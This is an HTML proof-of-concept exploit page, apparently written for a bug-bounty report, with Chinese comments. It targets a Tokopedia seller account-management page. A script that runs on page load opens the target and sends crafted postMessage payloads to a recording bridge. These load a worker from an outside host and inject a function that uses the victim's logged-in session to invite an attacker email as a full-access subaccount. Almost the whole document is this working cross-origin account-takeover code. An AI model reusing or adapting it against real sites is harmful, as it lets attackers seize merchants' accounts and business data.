<html>
  <script>
     function startExploit() {

    const targetWindow = window.open("https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user", "_blank");
    
    // 等待页面加载
    setTimeout(() => {
        console.log("[*] Sending InitRecorder...");
        
        const initPayload = {
            topic: "bytereplay.bridging",
            fromId: "attacker",
            id: "init-1",
            message: {
                type: "InitRecorder",
                payload: {
                    options: {
                        worker:"https://johnstonemees.github.io/worker.js",
                        trackers: ["html","image","js","Network"],  // 只启用 Network
                        
                        // interceptRequest 必须是字符串
                        interceptRequest: `(function(path, headers) {
                           fetch("https://seller-id.tokopedia.com/api/v1/seller/account_management/invite?locale=en&language=en", {
  "headers": {
    "accept": "*/*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache",
    "priority": "u=1, i",
    "credentials": "include", 
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "tt-ticket-guard-version": "2",
    "tt-ticket-guard-web-version": "1",
    "x-tt-oec-region": "ID"
  },
  "referrer": "https://seller-id.tokopedia.com/profile/account-setting/user-management?module=add_user",
  "body": '{"global_seller_roles":[{"global_seller_id":"7494048226256455526","roles":[{"identifier":"subaccount_role_full_access"}]}],"seller_roles":[],"default_language":"en","email":"esperamier+2@bugcrowdninja.com","mobile":"","user_name":"weattacker"}',
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
                            return {path: path, headers: headers};
                        })`,
                        
                        environment: {
                            type: "PROD-PUBLIC",
                            baseURL: "https://httpbin.org/post",
                            apiPrefix: "/api/"
                        }
                    }
                }
            }
        };
        
        targetWindow.postMessage(initPayload, '*');
        
        // 等待 InitRecorder 完成后发送 StartRecording
        setTimeout(() => {
            console.log("[*] Sending StartRecording...");
            
            const startPayload = {
                topic: "bytereplay.bridging",
                fromId: "attacker",
                id: "start-1",
                message: {
                    type: "StartRecording",
                    payload: {
                        mode: "streaming-http",
                        parent: "evil-recording",
                        refType: "iframe"
                    }
                }
            };
            
            targetWindow.postMessage(startPayload, '*');
        }, 2000);
        
    }, 10000);
}
     startExploit();
  </script>
 </html>
